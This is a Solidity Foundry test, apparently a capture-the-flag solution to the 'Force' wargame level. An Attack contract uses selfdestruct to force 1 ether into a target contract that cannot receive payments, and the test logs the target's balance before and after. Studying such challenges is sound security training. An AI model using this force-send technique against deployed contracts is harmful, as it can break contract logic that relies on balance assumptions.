// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {Test} from "forge-std/Test.sol";

import {HuffDeployer} from "foundry-huff/HuffDeployer.sol";

import {IForce} from "src/interfaces/IForce.sol";

contract Force is Test {
    address ATTACKER = makeAddr("Attacker");

    IForce forceInterface;

    function setUp() public {
        vm.deal(ATTACKER, 1 ether);

        address forceAddress = HuffDeployer.config().deploy("Force");

        forceInterface = IForce(forceAddress);
    }

    function test_PoC() public {
        console.log(
            "FORCE'S BALANCE (BEFORE ATTACK): ",
            address(forceInterface).balance
        );
        
        vm.prank(ATTACKER);
        new Attack{value: 1 ether}(forceInterface);

        console.log(
            "FORCE'S BALANCE (AFTER ATTACK): ",
            address(forceInterface).balance
        );
    }
}

contract Attack {
    constructor(IForce _forceInterface) payable {
        selfdestruct(payable(address(_forceInterface)));
    }
}
